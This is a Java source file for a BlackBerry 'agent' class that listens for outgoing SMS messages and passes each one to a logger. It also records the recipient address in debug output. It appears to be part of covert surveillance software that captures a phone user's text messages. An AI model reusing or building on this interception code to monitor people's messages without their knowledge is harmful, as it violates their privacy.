package blackberry.agent.sms;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import blackberry.fs.Path;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

import net.rim.blackberry.api.sms.OutboundMessageListener;
import net.rim.device.api.system.SMSParameters;

public class SMSOUTListener implements OutboundMessageListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SMSOUTListener", DebugLevel.VERBOSE);
    //#endif

    SmsListener smsListener;

    public boolean stop = false;
    
    public SMSOUTListener(SmsListener smsListener) {
        this.smsListener = smsListener;                
    }
   
    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public void notifyOutgoingMessage(Message message) {
        init();
        //#ifdef DEBUG_INFO
        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
        //#endif
        
        smsListener.saveLog(message, false);
    }

    private void init() {
        if(!Path.isInizialized()){
            Path.makeDirs();
        }
        Debug.init();
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public void notifyIncomingMessage(MessageConnection arg0) {
        init();
        //#ifdef DEBUG_INFO
        debug.info("notifyIncomingMessage: " + arg0.toString());
        //#endif        
    }

}
